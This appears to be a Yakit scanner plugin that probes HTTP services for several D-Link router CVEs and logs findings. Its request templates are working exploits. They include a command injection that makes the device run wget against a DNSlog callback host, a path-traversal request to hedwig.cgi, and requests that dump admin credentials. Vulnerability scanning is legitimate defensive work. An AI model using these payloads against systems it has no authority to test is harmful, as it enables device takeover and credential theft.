@@ -1,0 +1,187 @@
+# port scan plugin
+yakit.AutoInitYakit()
+
+// 准备发送的报文模版 
+PacketGet = `GET {{params(payload)}} HTTP/1.1
+Host: {{params(target)}}
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0
+
+`
+
+PacketPost = `POST /apply_sec.cgi HTTP/1.1
+Host: {{params(target)}}
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
+Connection: close
+Cookie: redirect=1; testing=1; sid=x; sessiontest=1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 60
+
+html_response_page=login_pic.asp&action=ping_test&ping_ipaddr=127.0.0.1%0awget%20-P%20/tmp/%20http://{{params(payload)}}
+`
+
+PacketPost1 = `POST /hedwig.cgi HTTP/1.1
+Host: {{params(target)}}
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
+Connection: close
+Cookie: uid=R8tBjwtFc8
+Content-Type: text/xml
+Content-Length: 60
+
+<?xml version="1.0" encoding="utf-8"?><postxml><module><service>../../../htdocs/webinc/getcfg/DEVICE.ACCOUNT.xml</service></module></postxml>
+`
+
+PacketPost2 = `POST /getcfg.php HTTP/1.1
+Host: {{params(target)}}
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
+Connection: close
+Cookie: uid=R8tBjwtFc8
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 60
+
+{{params(payload)}}
+`
+
+
+//漏洞检测规则函数 
+rules = []
+addRule = func(packet,payload, check , riskType, riskTypeVerbose, severity,reference) {
+    rules = append(rules, {
+        "packet": packet,
+        "payload": payload,
+        "check": check,
+        "type": riskType,
+        "typeVerbose": riskTypeVerbose,
+        "severity": severity,
+        "reference":reference,
+    })
+}
+
+//填充对应的漏洞检测规则
+domain = ""
+token = ""
+initDomain = () => {
+    domain, token, err = risk.NewDNSLogDomain()
+    yakit.Error("ERROR for fetch DNSLOG: %v", err)
+}
+getToken = () => {
+    return token
+}
+getDomain = () => {
+    if domain == "" { initDomain() }
+    return domain
+}
+addRule(PacketPost,`"$(echo '%s' | base64 --decode)"` % codec.EncodeBase64(getDomain()),func(rsp,header,body){
+    sleep(2)
+    res,err = risk.CheckDNSLogByToken(getToken())
+    if err != nil || len(res) == 0{
+        return false
+    }
+    return true
+},"命令执行","dlink-cve-2019-16920-rce","high","https://medium.com/@80vul/determine-the-device-model-affected-by-cve-2019-16920-by-zoomeye-bf6fec7f9bb3")
+
+addRule(PacketPost1,`/`,func(rsp,header,body){
+    if rsp.StatusCode == 200 && str.MatchAllOfSubString(header, `xml`) && str.MatchAllOfSubString(body, `</usrid>`,`</password>`,`<result>OK</result>`){
+        return true
+    }
+    return false
+},"信息泄露",`dlink-850l-info-leak`,"low","https://xz.aliyun.com/t/2941")
+
+addRule(PacketPost2,`SERVICES=DEVICE.ACCOUNT&AUTHORIZED_GROUP=1%0a`,func(rsp,header,body){
+    if rsp.StatusCode == 200 && str.MatchAllOfSubString(header, `xml`) && str.MatchAllOfSubString(body, `<name>`,`</password>`,`<result>OK</result>`){
+        return true
+    }
+    return false
+},"信息泄露",`dlink-cve-2019-17506`,"low","https://xz.aliyun.com/t/6453")
+
+
+addRule(PacketGet,`/config/getuser?index=0`,func(rsp,header,body){
+    if rsp.StatusCode == 200 && str.MatchAllOfSubString(header, `text/plain`) && str.MatchAllOfSubString(body, `name=admin`,`pass=`){
+        return true
+    }
+    return false
+},"信息泄露",`dlink-cve-2020-25078-account-disclosure`,"low","https://mp.weixin.qq.com/s/b7jyA5sylkDNauQbwZKvBg")
+
+
+addRule(PacketPost2,`SERVICES=DEVICE.ACCOUNT%0aAUTHORIZED_GROUP=1`,func(rsp,header,body){
+    if rsp.StatusCode == 200 && str.MatchAllOfSubString(header, `xml`) && str.MatchAllOfSubString(body, `<name>Admin</name>`,`</usrid>`,`</password>`){
+        return true
+    }
+    return false
+},"信息泄露",`yaml-dlink-cve-2020-9376-dump-credentials`,"low","https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-9376")
+
+
+//漏洞检测handle 
+handleRule = func(swg, isTls, addr, rule) {
+    swg.Add()
+    go func{
+        defer swg.Done()
+
+        defer func{
+            recover()
+        }
+
+        if rule.payload == "" {
+            rule.payload = getDomain()
+        }
+
+        resp, req, err = poc.HTTP(rule["packet"], poc.https(isTls), poc.params({"target": addr, "payload": rule.payload}),poc.redirectTimes(0))
+        if err != nil {
+            yakit.Error("poc.HTTP error: %v", err)
+            return
+        }
+        header, body = poc.Split(resp)
+        rspIns, _ = poc.ParseBytesToHTTPResponse(resp)
+        urlIns, _ = str.ExtractURLFromHTTPRequestRaw(req, isTls)
+        url = urlIns.String()
+        if rule.check(rspIns, header, body) {
+            yakit.Info("FOUND INFO for %v", rule.typeVerbose)
+            risk.NewRisk(
+                url, risk.severity(rule.severity), 
+                risk.title(sprintf("FOUND %v", rule.typeVerbose)),
+                risk.titleVerbose(sprintf("reference %v", rule.reference)),
+                risk.type(rule.type), risk.typeVerbose(rule.typeVerbose),
+                risk.payload(rule.payload), risk.details({
+                    "request": req,
+                    "response": resp,
+                    "url": url,
+                }),
+                risk.description("针对dlink  cve-2020-25078  cve-2020-9376 cve-2019-17506 850l-info-leak cve-2019-16920"),
+                risk.solution("Upgrade DLINK VERSION"),
+            )
+            return
+        }
+        return
+    }
+}
+
+
+handle = func(result) {
+    if !result.IsOpen() {
+        return
+    }
+
+    //判断是否是http
+    if len(result.Fingerprint.HttpFlows) <= 0 {
+        return
+    }
+
+    addr = str.HostPort(result.Target, result.Port)
+    isTls = str.IsTLSServer(str.HostPort(result.Target, result.Port))
+ dump(addr)
+ dump(isTls)
+    //漏洞检测
+    swg = sync.NewSizedWaitGroup(10)
+    for _, rule = range rules {
+        handleRule(swg, isTls, addr, rule)
+    }
+    swg.Wait()
+}
